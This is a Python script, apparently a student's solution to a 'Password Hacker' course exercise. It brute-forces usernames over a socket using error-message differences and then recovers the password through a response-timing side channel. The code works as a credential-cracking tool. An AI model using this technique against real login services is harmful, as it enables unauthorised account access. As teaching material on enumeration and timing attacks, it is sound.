import socket
import sys
import string
import copy
from itertools import product
import json
from datetime import datetime
from collections import deque
import logging

try:
    HOST = sys.argv[1] #first input
    PORT = int(sys.argv[2]) #second input
except IndexError:
    HOST = 'localhost'
    PORT = 9090

password_file_path = '/home/nick/PycharmProjects/Password Hacker with Python/Password Hacker with Python/task/hacking/passwords.txt'
login_file_path = r'C:\Users\snick\PycharmProjects\Password Hacker with Python\Password Hacker with Python\task\hacking\logins.txt'
symbols = string.ascii_lowercase+string.ascii_uppercase+'1234567890'
query_template = {
    "login":"plshldr",
    "password":"plshldr"
}

def case_permutations(word):
    lu_sequence = []
    for char in word:
        if char.isdigit():
            lu_sequence.append(char)
        else:
            lu_sequence.append((char.lower(), char.upper()))
    return [''.join(comb) for comb in product(*lu_sequence)]

def getDataFromFile(path):
    with open(path, 'r') as file:
        data_list = []
        for line in file:
            data_list.append(line.strip())
        return data_list

with (socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket):

    logging.basicConfig(filename='delta_time.log', level=logging.INFO)
    server_address = (HOST, PORT)
    new_socket.connect(server_address)
    login_list = getDataFromFile(login_file_path)
    #10^6 -> too many attempts
    c = 0
    break_outer = False
    for login in login_list:
        login_comb = case_permutations(login) # list of strings

        for combination in login_comb:
            query = copy.copy(query_template)
            query['login'] = combination
            query = json.dumps(query)
            encoded_query = query.encode('utf-8')
            new_socket.send(encoded_query)
            response = new_socket.recv(1024)
            response = response.decode('utf-8')
            response = json.loads(response) # this step can be skipped
            # if response.find('Exception happened during login') >= 0 or \
            #     response.find('Wrong password') >= 0:Building a Timer classBuilding a Timer class

            if response["result"] == 'Exception happened during login' or \
                response["result"] == 'Wrong password!':
                #this is the correct login
                query_template['login'] = combination
                break_outer = True
                break
            c+=1
            if c >= 10**6:
                print('Too many attempts')
                break_outer = True
                break
        if break_outer == True:
            break

    #now we can bruteforce the password
    # outer loop for every next symbol of the password
    # loop for every next char to try for the current symbol

    # algorithm: use timeit to measure the difference, then use it with time module.
    # in case if I use time or datetime I only can some logs to separate file (cuz I can not dubug the common way)

    query_template['password'] = ""
    break_outer = False

    while True: #->do while
        for char in symbols:
            query = copy.copy(query_template)
            query['password'] += str(char)
            query = json.dumps(query)
            encoded_query = query.encode('utf-8')
            start_time = datetime.now()
            new_socket.send(encoded_query)
            p_response = new_socket.recv(1024)
            end_time = datetime.now()
            time_delta = (end_time - start_time).total_seconds()
            logging.info(str(time_delta) + ' seconds elapsed')

            p_response = p_response.decode('utf-8')
            p_response = json.loads(p_response)

            if p_response['result'] == "Connection success!":
                query_template['password'] += str(char)
                break_outer = True
                break

            if time_delta > 0.1: # % of prev time
                query_template['password'] += str(char)
                break

        if break_outer:
            break

    query_template = json.dumps(query_template) # convert to JSON
    print(query_template) # correct login-password pair
    new_socket.close()